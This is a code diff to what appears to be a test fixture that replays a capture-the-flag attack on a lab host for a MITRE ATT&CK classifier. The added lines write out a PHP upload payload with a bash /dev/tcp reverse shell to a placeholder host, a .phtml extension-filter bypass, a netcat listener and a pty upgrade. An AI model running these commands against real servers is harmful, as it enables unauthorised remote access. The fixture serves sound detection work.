@@ -19,10 +19,11 @@
  *
  * One content adjustment, noted per the task-3 precedent (equivalence-preserving, not a library
  * change): the upload payload is written as a compact PHP one-liner —
- * `exec("/bin/sh -i <&3 >&3 2>&3")` — rather than quoting pentestmonkey's full php-reverse-shell.php
- * (the script both write-ups actually used). Same effect (a `/bin/sh -i` reverse shell landing on the
- * attacker's listener), and it keeps the transcript short; it also happens to be the same shell
- * text/pattern the deterministic MITRE classifier's reverse-shell override matches on (see
+ * `system("bash -c 'bash -i >& /dev/tcp/x.x.x.x/1234 0>&1'")` — rather than quoting pentestmonkey's
+ * full php-reverse-shell.php (the script both write-ups actually used). Same effect (a `bash -i`
+ * reverse shell landing on the attacker's listener at `x.x.x.x:1234`, matching the `nc -lvnp 1234`
+ * below), and it keeps the transcript short; it also happens to be the same shell text/pattern the
+ * deterministic MITRE classifier's reverse-shell override matches on (see
  * `src/lib/pipeline/mitre.ts`), so the payload-authoring step correctly classifies as Execution
  * (TA0002) rather than falling through to the generic low-confidence default for an unrecognized
  * `echo` invocation.
@@ -49,10 +50,10 @@ const STEPS: Step[] = [
   { cmd: "curl -s http://rootme.thm/panel/", gap: 15_000, dur: 900, lines: 6, out: '<form action="upload.php" method="post" enctype="multipart/form-data"> — an image upload panel; page text warns "PHP files are not allowed!"' },
 
   // --- Exploitation: extension-filter bypass, PHP reverse shell as www-data ---
-  { cmd: 'echo \'<?php exec("/bin/sh -i <&3 >&3 2>&3");?>\' > shell.phtml', gap: 60_000, dur: 400, lines: 1, out: "payload written as shell.phtml — the filter only checks for .php/.php3/.php4/.php5, and Apache's mod_php config still hands .phtml to the PHP interpreter" },
+  { cmd: 'echo \'<?php system("bash -c \\\'bash -i >& /dev/tcp/x.x.x.x/1234 0>&1\\\'"); ?>\' > shell.phtml', gap: 60_000, dur: 400, lines: 1, out: "payload written as shell.phtml — the filter only checks for .php/.php3/.php4/.php5, and Apache's mod_php config still hands .phtml to the PHP interpreter; system() calls back to x.x.x.x:1234" },
   { cmd: "nc -lvnp 1234", gap: 8_000, dur: 600, lines: 1, out: "listening on [any] 1234 ..." },
   { cmd: 'curl -F "file=@shell.phtml" http://rootme.thm/panel/upload.php', gap: 10_000, dur: 2_200, lines: 2, out: "200 OK — Successfully uploaded! stored as /uploads/shell.phtml" },
-  { cmd: "curl http://rootme.thm/uploads/shell.phtml", gap: 8_000, dur: 1_500, lines: 1, out: "request hangs — exec() spawned /bin/sh -i against the listener; www-data@rootme:/var/www/html$ (caught on the listener)" },
+  { cmd: "curl http://rootme.thm/uploads/shell.phtml", gap: 8_000, dur: 1_500, lines: 1, out: "request hangs — system() spawned the bash -i reverse shell against x.x.x.x:1234; www-data@rootme:/var/www/html$ (caught on the listener)" },
   { cmd: "id", gap: 4_000, dur: 300, lines: 1, out: "uid=33(www-data) gid=33(www-data) groups=33(www-data)" },
   { cmd: "python -c \"import pty; pty.spawn('/bin/bash')\"", gap: 5_000, dur: 800, lines: 1, out: "www-data@rootme:/var/www/html$ — upgraded the dumb pipe to a real pty" },
 
